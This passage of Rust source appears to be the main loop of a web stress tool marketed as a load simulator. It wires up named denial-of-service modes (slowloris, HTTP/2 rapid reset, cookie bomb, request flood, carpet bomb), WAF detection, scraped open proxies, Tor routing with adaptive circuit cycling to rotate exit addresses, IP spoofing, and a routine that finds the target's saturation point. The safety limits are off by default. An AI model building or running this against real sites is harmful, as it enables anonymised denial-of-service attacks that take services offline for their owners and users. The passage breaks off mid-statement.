        {
            let mut st = state.lock().await;
            st.target_url = target_url.to_string();
            st.load_concurrency = concurrency;
            st.custom_selector = custom_selector.clone();
            st.client_config = config.clone();
            st.verbose = verbose;
            st.max_retries = max_retries;
            st.tor_proxy = tor_proxy.clone();
            st.attack_mode = AttackMode::from_str(&attack_str);
            st.mode = ProxyMode::from_str(&mode_str);
            // Safety controls
            st.max_requests = max_requests.unwrap_or(0);
            st.concurrency_max = concurrency_max.unwrap_or(0);
            st.error_rate_threshold = error_rate_threshold;
            st.throughput_cap_mbps = throughput_cap_mbps.unwrap_or(0.0);
        }

        println!("[1/1] Probing domain...");
        if let Err(e) = probe_domain(&target_url, &state).await {
            eprintln!("  Failed to probe domain: {}", e);
        }

        // WAF detection (if requested)
        if detect_waf_flag {
            println!("[WAF] Detecting WAF type...");
            let waf_profile = detect_waf(&target_url, &config).await;
            {
                let st = state.lock().await;
                let mut guard = st.waf_profile.lock();
                if let Ok(ref mut waf) = guard {
                    **waf = waf_profile.clone();
                }
            }
            if waf_profile.confidence > 0.0 {
                println!("  WAF Detected: {} (confidence: {:.0}%)", waf_profile.waf_type, waf_profile.confidence * 100.0);
                if !waf_profile.detected_signatures.is_empty() {
                    for sig in &waf_profile.detected_signatures {
                        println!("    └─ {}", sig);
                    }
                }
            } else {
                println!("  No WAF detected or unable to determine WAF type.");
            }
        }
        let status = {
            let st = state.lock().await;
            st.probe_status.clone()
        };
        println!("  {}", status);
        println!();
        println!("[Done] Probe complete.");
        return;
    }

    if version {
        println!("{} v{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
        return;
    }
    if positional.is_empty() {
        print_list_modes();
        return;
    }

    println!("Mode: {} (proxy: {})", attack_str, mode_str);
    println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
    println!();

    // Probe domain
    let state = Arc::new(Mutex::new(AppState::new()));
    if (mode_str == "tor" || mode_str == "scrape-tor") && (tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some()) {
        println!("  Configuring Tor parameters via Control Port ({})...", tor_control);
        if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
            eprintln!("  Warning: Failed to configure Tor via Control Port: {}", e);
        } else {
            println!("  Tor parameters applied successfully.");
        }
    }
    {
        let mut st = state.lock().await;
        st.target_url = target_url.to_string();
        st.load_concurrency = concurrency;
        st.jitter_ms = jitter_ms;
        st.jitter_percent = jitter_percent;
        st.custom_selector = custom_selector.clone();
        st.client_config = config.clone();
        st.tor_proxy = tor_proxy.clone();
        st.verbose = verbose;
        st.max_retries = max_retries;
        st.attack_mode = match attack_str.as_str() {
            "bandwidth" => AttackMode::Bandwidth,
            "slowread" => AttackMode::SlowRead,
            "imageopt" => AttackMode::ImageOpt,
            "largepost" => AttackMode::LargePost,
            "assetspray" => AttackMode::AssetSpray,
            "rangereq" => AttackMode::RangeReq,
            "cookiebomb" => AttackMode::CookieBomb,
            "ssr" => AttackMode::Ssr,
            "middleware" => AttackMode::Middleware,
            "requestflood" => AttackMode::RequestFlood,
            "notfound" => AttackMode::NotFound,
            "slowloris" => AttackMode::Slowloris,
            "h2rapidreset" | "h2-rapid-reset" | "h2reset" => AttackMode::H2RapidReset,
            "carpetbomb" | "carpet-bomb" | "multivector" => AttackMode::CarpetBomb,
            _ => AttackMode::Normal,
        };

        match mode_str.as_str() {
            "tor" => st.mode = ProxyMode::Tor,
            "scrape-tor" => st.mode = ProxyMode::ScrapeTorFallback,
            _ => st.mode = ProxyMode::Scrape,
        }
    }

    println!("[1/3] Probing domain...");
    if let Err(e) = probe_domain(&target_url, &state).await {
        eprintln!("  Failed to probe domain: {}", e);
    }
    let status = {
        let st = state.lock().await;
        st.probe_status.clone()
    };
    println!("  {}", status);
    println!();

    // WAF detection (if requested)
    if detect_waf_flag {
        println!("[WAF] Detecting WAF type...");
        let waf_profile = detect_waf(&target_url, &config).await;
        {
            let st = state.lock().await;
            let mut guard = st.waf_profile.lock();
            if let Ok(ref mut waf) = guard {
                **waf = waf_profile.clone();
            }
        }
        if waf_profile.confidence > 0.0 {
            println!("  WAF Detected: {} (confidence: {:.0}%)", waf_profile.waf_type, waf_profile.confidence * 100.0);
            if !waf_profile.detected_signatures.is_empty() {
                for sig in &waf_profile.detected_signatures {
                    println!("    └─ {}", sig);
                }
            }
        } else {
            println!("  No WAF detected or unable to determine WAF type.");
        }
        println!();
    }

    println!("[2/3] Acquiring proxies...");
    // Handle --proxy-file and --tor-proxy first (bypass scraping)
    let proxies = if let Some(path) = &proxy_file {
        let content = std::fs::read_to_string(path).unwrap_or_default();
        let list: Vec<String> = content
            .split(|c: char| c.is_whitespace() || c == ',')
            .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
            .collect();
        if list.is_empty() {
            eprintln!("  No proxies found in file {}", path);
            None
        } else {
            println!("  Verifying {} proxies from file...", list.len());
            let verified = filter_alive_proxies(&list, &target_url, &config, &state).await;
            if verified.is_empty() {
                eprintln!("  No alive proxies found in file {}", path);
                None
            } else {
                Some(verified)
            }
        }
    } else if let Some(url) = &tor_proxy {
        let clean_url = url.trim_start_matches("socks5h://").trim_start_matches("socks5://").trim_start_matches("http://");
        Some(vec![format!("socks5h://tor:isolate@{}", clean_url)])
    } else {
        let mode = { state.lock().await.mode };
        get_proxies(mode, &state).await
    };
    match proxies {
        None => {
            eprintln!("  Failed to get proxies.");
            return;
        }
        Some(prox_list) => {
            println!("  Got {} proxies", prox_list.len());
            // Warm up Tor circuits whenever a Tor proxy is supplied (any mode)
            if tor_proxy.is_some() {
                println!("  Warming {} Tor circuits...", tor_circuits);
                // Cold Tor circuits can exceed the per-request timeout on first connect,
                // so warm up with a dedicated generous budget (circuit timeout or 30s).
                let warmup_timeout = tor_circuit_timeout.unwrap_or(30).max(30);
                warm_tor_circuits(&prox_list, &target_url, warmup_timeout, 1, tor_circuits).await;
                println!("  Tor circuits ready.");
            }
            if let Some(ref path) = save_proxies {
                let content = prox_list.join("\n");
                if let Err(e) = std::fs::write(path, content) {
                    eprintln!("  Failed to save proxies to {}: {}", path, e);
                } else {
                    println!("  Saved {} proxies to {}", prox_list.len(), path);
                }
            }
            if dry_run {
                println!("  [DRY RUN] Effective configuration:");
                println!("    Target: {}", target_url);
                println!("    Mode: {}", mode_str);
                println!("    Attack: {}", attack_str);
                println!("    Concurrency: {}", concurrency);
                println!("    Duration: {}s", duration_secs);
                println!("    Delay: {}ms  Jitter: {}ms", delay_ms, jitter_ms);
                if ramp_up_secs > 0 {
                    println!("    Ramp-up: {}s", ramp_up_secs);
                }
                if let Some(body) = CUSTOM_POST_BODY.get() {
                    println!("    Custom body: {}..", &body[..body.len().min(60)]);
                }
                if let Some(ct) = CUSTOM_CONTENT_TYPE.get() {
                    println!("    Content-Type: {}", ct);
                }
                println!("    Proxies found: {}", prox_list.len());
                println!("    Rotation: {}", rotation_strategy);
                if let Some(rate) = rate_limit {
                    println!("    Rate limit: {} req/s", rate);
                }
                println!("    Max redirects: {}", config.max_redirects);
                println!("    Timeout: {:?}", config.timeout);
                println!("    Pool idle timeout: {:?}", config.pool_idle_timeout);
                println!("    Tor circuits: {}", config.tor_circuits);
                println!("    Max errors: {}", max_errors.unwrap_or(999999));
                println!("    SSL verify: {}", !config.insecure);
                println!("    IP spoofing: {}", spoof_ip);
                println!("    Verbose: {}", verbose);
                if let Some(ref ua) = user_agent {
                    println!("    Custom UA: {}", ua);
                }
                if !custom_headers.is_empty() {
                    println!("    Custom headers: {}", custom_headers.len());
                }
                if let Some(ref lf) = log_file {
                    println!("    Log file: {}", lf);
                }
                if canary {
                    println!("    Canary: enabled");
                }
                if quiet {
                    println!("    Quiet mode: enabled");
                }
                if json_output {
                    println!("    JSON output: enabled");
                }
                println!();
                println!("  [DRY RUN] Skipping load test. Use without --dry-run to execute.");
                // Write CSV output if requested
                if let Some(path) = &output_csv {
                    write_probe_csv(path, &target_url, &status, &prox_list, concurrency, &attack_str);
                }
                return;
            }
            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list, &config, &rotation_strategy)));
            println!("[3/3] Running load for {}s...", duration_secs);
            {
                let mut s_vec = Vec::with_capacity(prox_list.len());
                // Try to load persisted sessions from file (hash-based naming)
                let mut h = DefaultHasher::new();
                h.write(target_url.as_bytes());
                let safe_name = format!("sessions_{:x}.json", h.finish());
                if let Ok(session_data) = std::fs::read_to_string(&safe_name) {
                    let sessions: Vec<String> = serde_json::from_str(&session_data).unwrap_or_else(|_| vec![]);
                    for (i, sess) in sessions.iter().enumerate() {
                        if i < prox_list.len() {
                            s_vec.push(std::sync::Mutex::new(sess.clone()));
                        }
                    }
                }
                // Fill remaining with empty sessions
                while s_vec.len() < prox_list.len() {
                    s_vec.push(std::sync::Mutex::new(String::new()));
                }
                state.lock().await.sessions = Arc::new(s_vec);
            }
            let stats = {
                let st = state.lock().await;
                st.stats.clone()
            };
            stats.concurrency.store(concurrency, Ordering::Relaxed);
    // Canary: run a single probe request before the actual load test
    if canary {
        println!("  Running canary health check...");
        let (max_retries, canary_timeout, canary_config) = {
            let st = state.lock().await;
            (st.max_retries, st.client_config.timeout, st.client_config.clone())
        };
        let mut canary_builder = browser_client_builder(&canary_config)
            .timeout(canary_timeout)
            .redirect(reqwest::redirect::Policy::none());
        if canary_config.insecure {
            canary_builder = canary_builder.danger_accept_invalid_certs(true);
        }
        let canary_client = match canary_builder.build() {
            Ok(c) => c,
            Err(e) => {
                eprintln!("  WARNING: Failed to build canary client: {}", e);
                reqwest::Client::new()
            }
        };
        match send_with_retry_for_probe(browser_request(canary_client.get(&target_url), false), max_retries, "canary").await {
            Ok(resp) => {
                let status = resp.status();
                let body_len = resp.content_length().unwrap_or(0);
                println!("  Canary: {} {} ({} bytes)", status, target_url, body_len);
                if !status.is_success() {
                    eprintln!("  WARNING: Canary returned non-success status {}", status);
                }
            }
            Err(e) => {
                eprintln!("  WARNING: Canary failed after retries: {}", e);
            }
        }
        println!("  Canary complete. Starting load test...");
    }

            stats.running.store(true, Ordering::Relaxed);
            
            // Set up Ctrl+C handler for graceful shutdown
            let running_clone = stats.running.clone();
            tokio::spawn(async move {
                if let Err(e) = signal::ctrl_c().await {
                    eprintln!("Failed to listen for Ctrl+C: {}", e);
                    return;
                }
                eprintln!("
  [Ctrl+C received] Shutting down gracefully...");
                running_clone.store(false, Ordering::Relaxed);
            });
            
            let state_clone = state.clone();
            let pool_clone = pool.clone();
            let stats_clone = stats.clone();
            let start = Instant::now();
            let mut elapsed_secs = duration_secs;

            // -- Saturation-finder mode (--find-max) --
            // Ramp concurrency up in doubling steps, run a short burst at each, and lock in the
            // highest concurrency whose measured RPS still increased (i.e. before saturation/errors).
            if find_max {
                let step_secs = 6u64;
                let mut best_conc = concurrency.max(1);
                let mut best_rps = 0.0f64;
                let mut prev_reqs = stats.total_requests.load(Ordering::Relaxed);
                let mut prev_errs = stats.errors.load(Ordering::Relaxed);
                let mut first = true;
                let mut step = 2usize;
                while step <= 512 {
                    // Configure this burst's concurrency.
                    {
                        let mut st = state.lock().await;
                        st.load_concurrency = step;
                    }
                    stats.concurrency.store(step, Ordering::Relaxed);
                    stats.abort.store(false, Ordering::Relaxed);
                    stats.running.store(true, Ordering::Relaxed);
                    let burst_start = Instant::now();
                    let handle = tokio::spawn(run_load(state.clone(), pool.clone(), stats.clone(), delay_ms, max_errors));
                    tokio::time::sleep(Duration::from_secs(step_secs)).await;
                    stats.abort.store(true, Ordering::Relaxed);
                    stats.running.store(false, Ordering::Relaxed);
                    let _ = handle.await;
                    tokio::time::sleep(Duration::from_millis(300)).await;

                    let now_reqs = stats.total_requests.load(Ordering::Relaxed);
                    let now_errs = stats.errors.load(Ordering::Relaxed);
                    let req_delta = now_reqs.saturating_sub(prev_reqs);
                    let err_delta = now_errs.saturating_sub(prev_errs);
                    let el = burst_start.elapsed().as_secs_f64().max(0.5);
                    let rps = req_delta as f64 / el;
                    let err_rate = if req_delta > 0 { err_delta as f64 / req_delta as f64 } else { 1.0 };
                    println!("  [find-max] conc={:>3}  {:.1} req/s  (Δ{} req, {} err, {:.1}% err)", step, rps, req_delta, err_delta, err_rate * 100.0);

                    if first {
                        best_conc = step; best_rps = rps; first = false;
                    } else if rps > best_rps * 1.02 && err_rate < 0.20 {
                        // Throughput still scaling and errors acceptable -> keep climbing.
                        best_conc = step; best_rps = rps;
                    } else {
                        // Saturated (RPS plateaued/dropped) or error spike -> stop here.
                        break;
                    }
                    prev_reqs = now_reqs;
                    prev_errs = now_errs;
                    step *= 2;
                }
                println!("  [find-max] Max sustainable concurrency locked at {} (~{:.1} req/s)", best_conc, best_rps);
                // Apply the winner for the remainder of this run.
                {
                    let mut st = state.lock().await;
                    st.load_concurrency = best_conc;
                }
                stats.concurrency.store(best_conc, Ordering::Relaxed);
            }
            tokio::spawn(run_load(state_clone.clone(), pool_clone, stats_clone, delay_ms, max_errors));
            tokio::spawn(listen_stdin(state_clone.clone()));
            tokio::spawn(ramp_up_concurrency(state_clone, concurrency, ramp_up_secs));

            // Adaptive Tor Circuit Cycling Background Loop
            // Cycles circuits based on observed error rate:
            //   >50% error → cycle every 10s (aggressive)
            //   20-50% error → cycle every 30s (moderate)
            //   <20% error → cycle every 60s (conservative)
            if mode_str == "tor" || mode_str == "scrape-tor" {
                let tor_ctrl = tor_control.clone();
                let stats_tor = stats.clone();
                let pool_tor = pool.clone();
                tokio::spawn(async move {
                    // Check if Tor Control Port is reachable before starting loop
                    // Try both TCP and Unix socket paths
                    let control_reachable = match resolve_control_addr(&tor_ctrl) {
                        Ok((ref addr, ref typ)) => {
                            if typ == "unix" {
                                tokio::net::UnixStream::connect(addr).await.is_ok()
                            } else {
                                tokio::net::TcpStream::connect(format!("{}:{}", addr, typ))
                                    .await
                                    .is_ok()
                            }
                        }
                        Err(_) => false,
                    };
                    if control_reachable {
                        let mut last_total_reqs: u64 = 0;
                        let mut last_errors: u64 = 0;
                        while stats_tor.running.load(Ordering::Relaxed) {
                            tokio::time::sleep(Duration::from_secs(15)).await;
                            if !stats_tor.running.load(Ordering::Relaxed) { break; }
                            
                            // Calculate error rate over the last 15s window
                            let now_reqs = stats_tor.total_requests.load(Ordering::Relaxed);
                            let now_errors = stats_tor.errors.load(Ordering::Relaxed);
                            let req_delta = now_reqs.saturating_sub(last_total_reqs);
                            let err_delta = now_errors.saturating_sub(last_errors);
                            last_total_reqs = now_reqs;
                            last_errors = now_errors;
                            
                            // Determine cycle interval based on error rate
                            let cycle_interval = if req_delta > 0 {
                                let error_rate = err_delta as f64 / req_delta as f64;
                                if error_rate > 0.50 {
                                    10 // Aggressive: high error rate
                                } else if error_rate > 0.20 {
                                    30 // Moderate
                                } else {
                                    60 // Conservative: low error rate
                                }
                            } else {
                                60 // No requests yet, conservative
                            };
                            
                            if stats_tor.running.load(Ordering::Relaxed) {
                                if cycle_tor_circuit(&tor_ctrl).await.is_ok() {
                                    // A fresh circuit changes every circuit's exit node, so any
                                    // per-circuit failure penalty / cooldown ban is now stale —
                                    // reset it so a previously-banned circuit gets a fair chance
                                    // instead of staying skipped forever (wasted throughput).
                                    if let Ok(mut g) = pool_tor.lock() {
                                        for i in 0..g.circuit_failures.len() {
                                            g.circuit_failures[i] = 0;
                                            g.circuit_cooldown[i] = Instant::now();
                                        }
                                    }
                                }
                                if cycle_interval < 30 {
                                    // Sleep briefly before cycling to let the new circuit build
                                    tokio::time::sleep(Duration::from_secs(cycle_interval)).await;
                                }
                            }
                        }
                    } else {
                        // Control port is optional. Without it, dynamic circuit cycling is
                        // skipped but static per-credential circuit isolation still works.
                        println!("  [System] No Tor control port at {}; dynamic circuit cycling off (static circuits still isolated).", tor_ctrl);
                    }
                });
            }

            // Proxy Pool Refresh Background Loop
            if mode_str == "scrape" || mode_str == "scrape-tor" {
                let pool_refresh = pool.clone();
                let state_refresh = state.clone();
                let stats_refresh = stats.clone();
                let config_refresh = config.clone();
                tokio::spawn(async move {
                    while stats_refresh.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(60)).await;
                        if !stats_refresh.running.load(Ordering::Relaxed) { break; }
                        if let Some(new_proxies) = get_proxies(ProxyMode::Scrape, &state_refresh).await {
                            let mut pool_lock = match pool_refresh.lock() {
                                Ok(guard) => guard,
                                Err(e) => {
                                    eprintln!("  Pool refresh lock poisoned: {}", e);
                                    continue;
                                }
                            };
                            let fresh_pool = ProxyPool::new(&new_proxies, &config_refresh, &rotation_strategy);
                            pool_lock.clients.extend(fresh_pool.clients);
                            pool_lock.labels.extend(fresh_pool.labels);
                            let new_n = pool_lock.clients.len();
                            pool_lock.cooldown_until.resize(new_n, Instant::now());
                            pool_lock.failure_tier.resize(new_n, 0);
                            pool_lock.succeeded.resize(new_n, false);
                            pool_lock.weights.resize(new_n, 1.0);
                        }
                    }
                });
            }

            // PID Concurrency Auto-tuning Loop
            if auto_tune {
                let stats_tune = stats.clone();
                let state_tune = state.clone();
                let is_tor_mode = mode_str == "tor" || mode_str == "scrape-tor";
                tokio::spawn(async move {
                    let mut last_errors = 0u64;
                    while stats_tune.running.load(Ordering::Relaxed) {
                        tokio::time::sleep(Duration::from_secs(2)).await;
                        if !stats_tune.running.load(Ordering::Relaxed) { break; }
                        
                        let cur_errors = stats_tune.errors.load(Ordering::Relaxed);
                        let new_errors = cur_errors.saturating_sub(last_errors);
                        last_errors = cur_errors;
                        
                        let (p50, _, _, _) = stats_tune.latency_samples.get_percentiles();
                        let current_conc = stats_tune.concurrency.load(Ordering::Relaxed);
                        
                        let mut target_conc = current_conc;
                        if new_errors > 5 || p50 > 1500 {
                            target_conc = target_conc.saturating_sub(5).max(5);
                        } else if p50 < 400 {
                            let inc = if is_tor_mode && current_conc >= tor_ssthresh { 1 } else { 2 };
                            target_conc = target_conc.saturating_add(inc).min(500);
                        }
                        
                        if target_conc != current_conc {
                            stats_tune.concurrency.store(target_conc, Ordering::Relaxed);
                            state_tune.lock().await.load_concurrency = target_conc;
                        }
                    }
                });
            }

            let mut last_requests = 0u64;
            let mut last_bytes = 0u64;
            let mut last_time = start;

            while start.elapsed().as_secs() < duration_secs {
                tokio::time::sleep(Duration::from_secs(stats_interval_secs)).await;
                let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
                let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
                let cur_errors = stats.errors.load(Ordering::Relaxed);
                let cur_latency = stats.total_latency_ms.load(Ordering::Relaxed);

                let now = Instant::now();
                let delta_t = now.duration_since(last_time).as_secs_f64();
                
                let mut req_rate = 0.0;
                let mut byte_rate = 0.0;
                if delta_t > 0.0 {
                    req_rate = (cur_reqs - last_requests) as f64 / delta_t;
                    byte_rate = (cur_bytes - last_bytes) as f64 / delta_t / 1024.0;
                }
                let avg_latency = if cur_reqs > 0 { cur_latency as f64 / cur_reqs as f64 } else { 0.0 };
                
                let (p50, p90, p95, p99) = stats.latency_samples.get_percentiles();
                let active_concurrency = stats.concurrency.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs();

                if tui {
                    print!("{}[2J{}[1;1H", 27 as char, 27 as char);
                    println!("========================================================================");
                    println!("   🚀 SIMULATE LOAD RUST — Interactive Testing Dashboard");
                    println!("========================================================================");
                    println!("   Target URL:  {}", target_url);
                    println!("   Attack Mode: {} | Concurrency: {} | Duration: {}s", attack_str, active_concurrency, duration_secs);
                    if ramp_up_secs > 0 {
                        println!("   Ramp-up: {}s", ramp_up_secs);
                    }
                    if let Some((ref host, ip)) = config.pinned_dns {
                        println!("   DNS Pinning: Enabled ({}) -> IP: {}", host, ip);
                    } else {
                        println!("   DNS Pinning: Disabled");
                    }
                    println!("========================================================================");
                    let pct = (elapsed as f64 / duration_secs as f64 * 100.0).min(100.0) as usize;
                    let filled = pct / 4;
                    let empty = 25 - filled;
                    let bar: String = std::iter::repeat_n("█", filled).chain(std::iter::repeat_n("░", empty)).collect();
                    println!("   [Progress]   [{}] {}% (Elapsed: {}s)", bar, pct, elapsed);
                    println!("========================================================================");
                    println!("   [Metrics]");
                    println!("   Req/s:       {:.1} req/s          Bandwidth:   {:.2} KB/s", req_rate, byte_rate);
                    println!("   Successes:   {} (2xx)           Errors:      {} (Timeout: {}, Connect: {}, Other: {})", 
                        stats.status_2xx.load(Ordering::Relaxed), 
                        cur_errors,
                        stats.error_timeout.load(Ordering::Relaxed),
                        stats.error_connect.load(Ordering::Relaxed),
                        stats.error_other.load(Ordering::Relaxed)
                    );
                    println!("   Average RTT: {:.1} ms                Active Prox: {} / {}", 
                        avg_latency, 
                        prox_list.len().saturating_sub(cur_errors as usize), 
                        prox_list.len()
                    );
                    println!("========================================================================");
                    println!("   [Latency Percentiles]");
                    println!("   p50: {}ms   |   p90: {}ms   |   p95: {}ms   |   p99: {}ms", p50, p90, p95, p99);
                    println!("========================================================================");
                    println!("   [Response Codes]");
                    println!("   2xx: {}  |  3xx: {}  |  4xx: {}  |  5xx: {}  |  Other: {}",
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        stats.status_other.load(Ordering::Relaxed)
                    );
                    // Safety controls status (read from AppState)
                    let safety = {
                        let st = state.lock().await;
                        (st.max_requests, st.concurrency_max, st.error_rate_threshold, st.throughput_cap_mbps)
                    };
                    println!("   [Safety Controls]");
                    println!("   Max Requests:  {} ({})", if safety.0 > 0 { safety.0 } else { 0 }, if safety.0 > 0 { "ACTIVE" } else { "disabled" });
                    println!("   Concurrency Max: {} ({})", if safety.1 > 0 { safety.1 } else { 0 }, if safety.1 > 0 { "ACTIVE" } else { "disabled" });
                    let err_pct = if safety.2 > 0.0 { safety.2 * 100.0 } else { 0.0 };
                    println!("   Error Rate Threshold: {:.1}% ({})", err_pct, if safety.2 < 1.0 { "ACTIVE" } else { "disabled" });
                    let throughput_display = if safety.3 > 0.0 { safety.3 } else { 0.0 };
                    println!("   Throughput Cap: {:.1} Mbps ({})", throughput_display, if safety.3 > 0.0 { "ACTIVE" } else { "disabled" });
                    // WAF profile display (TUI)
                    if let Ok(waf) = state.lock().await.waf_profile.lock() {
                        if waf.confidence > 0.0 {
                            println!("   [WAF Profile]");
                            println!("   Type: {} (confidence: {:.0}%)", waf.waf_type, waf.confidence * 100.0);
                            for sig in &waf.detected_signatures {
                                let truncated = if sig.len() > 55 { format!("{}...", &sig[..55]) } else { sig.clone() };
                                println!("     └─ {}", truncated);
                            }
                        }
                    }
                    // Multi-Tor instances (TUI)
                    {
                        let tor_instances = discover_multi_tor();
                        if !tor_instances.is_empty() {
                            println!("   [Tor Instances]");
                            for inst in &tor_instances {
                                let status_char = if inst.alive { "●" } else { "○" };
                                println!("   {} :{:<5} → {}  Status: {}",
                                    status_char, inst.socks_port, inst.country,
                                    if inst.alive { "ONLINE" } else { "STOPPED" }
                                );
                            }
                        }
                    }
                    println!("================================================================================\n");
                    println!(
                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms (p50: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
                        elapsed, req_rate, byte_rate, avg_latency, p50, p99,
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        cur_errors,
                        stats.error_timeout.load(Ordering::Relaxed),
                        stats.error_connect.load(Ordering::Relaxed),
                        stats.error_other.load(Ordering::Relaxed)
                    );
                } else if !quiet {
                    // Machine-parseable stats tick for the GUI dashboard.
                    // Must satisfy renderer.js: elapsedRegex + statsRegex + codesRegex
                    // (codesRegex requires the "Other:" field between 5xx and Errors).
                    println!(
                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Latency: {:.1}ms (p50: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Other: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
                        elapsed, req_rate, byte_rate, avg_latency, p50, p99,
                        stats.status_2xx.load(Ordering::Relaxed),
                        stats.status_3xx.load(Ordering::Relaxed),
                        stats.status_4xx.load(Ordering::Relaxed),
                        stats.status_5xx.load(Ordering::Relaxed),
                        stats.status_other.load(Ordering::Relaxed),
                        cur_errors,
                        stats.error_timeout.load(Ordering::Relaxed),
                        stats.error_connect.load(Ordering::Relaxed),
                        stats.error_other.load(Ordering::Relaxed)
                    );
                }
                
                last_requests = cur_reqs;
                last_bytes = cur_bytes;
                last_time = now;

                if let Some(max_err) = max_errors {
                    if cur_errors >= max_err {
                        elapsed_secs = start.elapsed().as_secs().max(1);
                        break;
                    }
                }
            }
            stats.running.store(false, Ordering::Relaxed);

            let final_reqs = stats.total_requests.load(Ordering::Relaxed);
            let final_bytes = stats.total_bytes.load(Ordering::Relaxed);
            let final_latency = stats.total_latency_ms.load(Ordering::Relaxed);
            let final_avg_latency = if final_reqs > 0 { final_latency as f64 / final_reqs as f64 } else { 0.0 };
            
            let (p50, p90, p95, p99) = stats.latency_samples.get_percentiles();
            
            let final_stats = format!(
                "Completed: {} req, {} bytes ({:.2} KB/s) | Avg Latency: {:.1}ms (p50: {}ms, p90: {}ms, p95: {}ms, p99: {}ms) | 2xx: {} | 3xx: {} | 4xx: {} | 5xx: {} | Errors: {} (Timeout: {}, Connect: {}, Other: {})",
                final_reqs,
                final_bytes,
                final_bytes as f64 / elapsed_secs as f64 / 1024.0,
                final_avg_latency,
                p50, p90, p95, p99,
                stats.status_2xx.load(Ordering::Relaxed),
                stats.status_3xx.load(Ordering::Relaxed),
                stats.status_4xx.load(Ordering::Relaxed),
                stats.status_5xx.load(Ordering::Relaxed),
                stats.errors.load(Ordering::Relaxed),
                stats.error_timeout.load(Ordering::Relaxed),
                stats.error_connect.load(Ordering::Relaxed),
                stats.error_other.load(Ordering::Relaxed)
            );
            if !quiet {
                println!("  {}", final_stats);
                // Per-status-code histogram (lock-free array indexed by code-100).
                let mut hist_entries: Vec<(u16, u64)> = (100..=999)
                    .map(|c| (c, stats.status_hist[c as usize - 100].load(Ordering::Relaxed)))
                    .filter(|&(_, n)| n > 0)
                    .collect();
                hist_entries.sort_by(|a, b| b.1.cmp(&a.1));
                if !hist_entries.is_empty() {
                    let parts: Vec<String> = hist_entries.iter().map(|(c, n)| format!("{}:{}", c, n)).collect();
                    println!("  Histogram: {}", parts.join("  "));
                }
                // Print safety controls info
                {
                    let st = state.lock().await;
                    println!("  Safety Controls: max_reqs={} ({}), conc_max={} ({}), err_thresh={:.1}% ({}), throughput_cap={:.1}Mbps ({})",
                        if st.max_requests > 0 { st.max_requests } else { 0 }, if st.max_requests > 0 { "ACTIVE" } else { "disabled" },
                        if st.concurrency_max > 0 { st.concurrency_max } else { 0 }, if st.concurrency_max > 0 { "ACTIVE" } else { "disabled" },
                        st.error_rate_threshold * 100.0, if st.error_rate_threshold < 1.0 { "ACTIVE" } else { "disabled" },
                        st.throughput_cap_mbps, if st.throughput_cap_mbps > 0.0 { "ACTIVE" } else { "disabled" });
                    // Print WAF profile (if detected)
                    {
                        let guard = st.waf_profile.lock();
                        if let Ok(waf) = guard {
                            if waf.confidence > 0.0 {
                                println!("  WAF Profile: {} (confidence: {:.0}%)", waf.waf_type, waf.confidence * 100.0);
                                for sig in &waf.detected_signatures {
                                    println!("    └─ {}", sig);
                                }
                            }
                        }
                    }
                }
            }
            if let Some(ref log_path) = log_file {
                if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
                    use std::io::Write;
                    let _ = writeln!(file, "[{}] {}", elapsed_secs, final_stats);
                }
            }
            if json_output {
                // Lock state once for all post-run data
                let state_guard = state.lock().await;
                let sessions: Vec<String> = state_guard.sessions.iter().map(|s| {
                    match s.lock() {
                        Ok(g) => g.clone(),
                        Err(poisoned) => poisoned.into_inner().clone(),
                    }
                }).collect();

                // Persist sessions for next run
                if let Ok(json) = serde_json::to_string(&sessions) {
                    let mut h = DefaultHasher::new();
                    h.write(target_url.as_bytes());
                    let safe_name = format!("sessions_{:x}.json", h.finish());
                    let _ = std::fs::write(&safe_name, json);
                }

                let error_rate = if final_reqs > 0 {
                    stats.errors.load(Ordering::Relaxed) as f64 / final_reqs as f64
                } else {
                    0.0
                };
                let json = serde_json::json!({
                    "target_url": target_url,
                    "mode": mode_str,
                    "attack_mode": attack_str,
                    "concurrency": concurrency,
                    "duration_secs": duration_secs,
                    "elapsed_secs": elapsed_secs,
                    "total_requests": final_reqs,
                    "total_bytes": final_bytes,
                    "bytes_per_second": final_bytes as f64 / elapsed_secs as f64,
                    "requests_per_second": final_reqs as f64 / elapsed_secs as f64,
                    "avg_latency_ms": final_avg_latency,
                    "percentiles": {
                        "p50": p50,
                        "p90": p90,
                        "p95": p95,
                        "p99": p99
                    },
                    "status_codes": {
                        "2xx": stats.status_2xx.load(Ordering::Relaxed),
                        "3xx": stats.status_3xx.load(Ordering::Relaxed),
                        "4xx": stats.status_4xx.load(Ordering::Relaxed),
                        "5xx": stats.status_5xx.load(Ordering::Relaxed),
                        "other": stats.status_other.load(Ordering::Relaxed)
                    },
                    "errors": {
                        "total": stats.errors.load(Ordering::Relaxed),
                        "timeout": stats.error_timeout.load(Ordering::Relaxed),
                        "connect": stats.error_connect.load(Ordering::Relaxed),
                        "other": stats.error_other.load(Ordering::Relaxed)
                    },
                    "error_rate": (error_rate * 10000.0).round() / 10000.0,
                    "safety_controls": {
                        "max_requests": state_guard.max_requests,
